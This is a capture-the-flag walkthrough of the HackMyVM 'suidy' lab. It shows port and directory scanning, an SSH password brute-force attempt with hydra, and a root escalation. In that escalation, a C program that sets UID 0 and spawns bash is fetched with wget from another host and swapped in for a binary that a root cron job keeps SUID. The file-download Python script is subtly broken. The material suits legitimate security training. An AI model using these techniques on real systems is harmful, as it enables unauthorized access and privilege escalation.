***Target: 10.0.0.40***  
***Difficulty: Medium***  
***Source: https://hackmyvm.eu/machines/machine.php?vm=suidy***

## ***NMAP***

    $ nmap -sS -T4 -p- 10.0.0.40

    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

The nmap scan found 2 open ports, let's start by enumerating HTTP. 

## ***HTTP***

![image](https://user-images.githubusercontent.com/76552238/159710916-c021bf63-edc1-47cd-a087-45e27fd78a21.png)

Going to http://10.0.0.40 we are greeted with a friendly message.  

![image](https://user-images.githubusercontent.com/76552238/159711102-7cb51c27-544c-4978-b2bb-9ec1cdd27f2b.png)

And also a friendly comment, but no actual information. Let's brute force the directories. 

    $ gobuster dir -u http://10.0.0.40 -w /usr/share/wordlists/dirb/common.txt

    /index.html           (Status: 200) [Size: 22]
    /robots.txt           (Status: 200) [Size: 362]

Going to robots.txt we get this message.

robots.txt:

![image](https://user-images.githubusercontent.com/76552238/159711486-5ebf30e8-b561-453c-a512-cdfbb6be1609.png)

<!--/hi /....\..\.-\--.\.-\..\-. shehatesme-->

I didn't understand what was the meaning of the wired string so I searched similar patterns online and found out is was a 'Morse' code.

    Morse decode ---> H I A G A I N

Not very helpful but using the developer tools we can see the site has a comment.

![image](https://user-images.githubusercontent.com/76552238/159712092-cebf3fc0-b411-43f0-9ff6-178f7396e348.png)


Going to http://10.0.0.40/shehatesme we have a message.

![image](https://user-images.githubusercontent.com/76552238/159712255-d52ceeb6-d251-4bd8-af69-6b891ece1b8e.png)

    She hates me because I FOUND THE REAL SECRET! I put in this directory a lot of .txt files. ONE of .txt files contains credentials like "theuser/thepass" to access to her system! All that you need is an small dict from Seclist! 

>

    $ gobuster dir -u http://10.0.0.40/shehatesme/ -w /usr/share/seclists/Miscellaneous/lang-english.txt -x txt

I downloaded the tool '***seclists***' from ***https://github.com/danielmiessler/SecLists*** and after using the wordlist ***/usr/share/seclists/Miscellaneous/lang-english.txt*** I found these text files in the directory ***/shehatesme***.

    /about.txt            (Status: 200) [Size: 16]
    /admin.txt            (Status: 200) [Size: 16]
    /airport.txt          (Status: 200) [Size: 16]
    /alba.txt             (Status: 200) [Size: 16]
    /art.txt              (Status: 200) [Size: 16]
    /blog.txt             (Status: 200) [Size: 16]
    /es.txt               (Status: 200) [Size: 16]
    /folder.txt           (Status: 200) [Size: 16]
    /forums.txt           (Status: 200) [Size: 16]
    /full.txt             (Status: 200) [Size: 16]
    /guide.txt            (Status: 200) [Size: 16]
    /issues.txt           (Status: 200) [Size: 16]
    /java.txt             (Status: 200) [Size: 16]
    /jobs.txt             (Status: 200) [Size: 16]
    /link.txt             (Status: 200) [Size: 16]
    /network.txt          (Status: 200) [Size: 16]
    /new.txt              (Status: 200) [Size: 16]
    /other.txt            (Status: 200) [Size: 16]
    /page.txt             (Status: 200) [Size: 16]
    /privacy.txt          (Status: 200) [Size: 16]
    /search.txt           (Status: 200) [Size: 16]
    /secret.txt           (Status: 200) [Size: 16]
    /space.txt            (Status: 200) [Size: 16]
    /welcome.txt          (Status: 200) [Size: 16]
    /wha.txt              (Status: 200) [Size: 16]
    /cymru.txt            (Status: 200) [Size: 16]
    /google.txt           (Status: 200) [Size: 16]

Since the message says there are usernames and passwords in the files we need download and read them. After moving the file names to the file ***foundFiles.txt***, we can write a Python script to download the files to the directory ***/Files*** and then read them.

### ***findCredsFiles.py:***

	import requests
	import urllib
	
	URL = "http://10.0.0.40/shehatesme"
	
	with open ("./foundFiles.txt","r") as file:
	    lines = file.readlines()
	    for index in range(len(lines)):
	        fileName = lines[index].rstrip()
	        req = requests.post((URL + "/" + fileName) ,allow_redirects=True)
        urllib.request.urlretrieve(urlWithFiles, "Files/"+fileName)

>

    $ cd Files
    $ cat * | sort | uniq

    hidden1/passZZ!
    jaime11/JKiufg6
    jhfbvgt/iugbnvh
    john765/FDrhguy
    maria11/jhfgyRf
    mmnnbbv/iughtyr
    nhvjguy/kjhgyut
    yuijhse/hjupnkk

I divided the users and passwords to separate files.

    $ cat * | sort | uniq | cut -d '/' -f1 > ../users.txt
    $ cat * | sort | uniq | cut -d '/' -f2 > ../passwords.txt

Now that we have credentials we can brute force the SSH login. 

    $ hydra -L users.txt -P passwords.txt ssh://10.0.0.40 -IV 

Surprisingly none of the credentials we found were valid. Turns out the right credentials are ***theuser:thepass*** that were stated in the message.
(一_一)

After logging in we can find the first flag.

    $ cat user.txt 

![image](https://user-images.githubusercontent.com/76552238/159715397-d7064a03-7d28-4639-994a-e5d166199a59.png)


## ***PRIVILEGE ESCALATION***

Going to the ***/home*** we can that there is another user on the machine.

![image](https://user-images.githubusercontent.com/76552238/159715912-145678ac-7f10-4ab3-abe6-68087c484178.png)

Going to the directory ***/home/suidy*** we have some interesting information.

![image](https://user-images.githubusercontent.com/76552238/159715997-03003c88-1afa-4e81-9971-53e614922f6d.png)


### ***/home/suidy/note.txt***

    I love SUID files!
    The best file is suidyyyyy because users can use it to feel as I feel.
    root know it and run an script to be sure that my file has SUID. 
    If you are "theuser" I hate you!

    -suidy

The note says that there is a program on ***/root*** that checks if the executable '***suidyyyyy***' is SUID, we can upload '***pspy64s***' from ***https://github.com/DominicBreuker/pspy*** to the machine and see what happens.  

![image](https://user-images.githubusercontent.com/76552238/159716779-c075664a-f3d2-4ade-bc04-1accff865b6a.png)

If we run ***/home/suidy/suidyyyyy*** we switch to 'suidy' user.

![image](https://user-images.githubusercontent.com/76552238/159717048-6afa0de0-0dca-4394-8ee6-6417b7c3cb4b.png)

Because the script ***/root/timer.sh*** allows ***/home/suidy/suidyyyyy*** to be run with SUID permissions we can move another custom script that gives our user the 'UID' and 'GID' of the root user and a shell).

    UID:

    A UID (user identifier) is a number assigned by Linux to each user on the system. This number is used to identify the user to the system and to determine which system resources the user can access.

    - UID 0 (zero) is reserved for the root.
    - UIDs 1–99 are reserved for other predefined accounts.
    - UID 100–999 are reserved by system for administrative and system accounts/groups.
    - UID 1000–10000 are occupied by applications account.
    - UID 10000+ are used for user accounts.

    GID:

    Groups in Linux are defined by GIDs (group IDs).

    - GID 0 (zero) is reserved for the root group.
    - GID 1–99 are reserved for the system and application use.
    - GID 100+ allocated for the user’s group.

    From https://medium.com/@gggauravgandhi/uid-user-identifier-and-gid-group-identifier-in-linux-121ea68bf510

>

We can write a C script that changes our UID and GID.

### ***suidy.c:***

    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
        #include <stdlib.h>
            
        int main(void)
    {
        setuid(0);
        setgid(0);
        system("/bin/bash");
    }

>

    $ wget 10.0.0.27/suidy.c /tmp
    $ cd /tmp
    $ gcc suidy.c -o suidyyyyy
    $ mv suidyyyyy /home/suidy/suidyyyyy
    $ /home/suidy/suidyyyyy
    $ id -a

![image](https://user-images.githubusercontent.com/76552238/159723026-cbd23918-259c-489b-b029-87c8de207834.png)

After downloading the script to the remote machine and executing it, we get a shell as the root user.  
We can now read the final flag.

### ***/root/root.txt:***

![image](https://user-images.githubusercontent.com/76552238/159723308-566fe009-1fb6-4af5-b892-8e3dcdddab26.png)
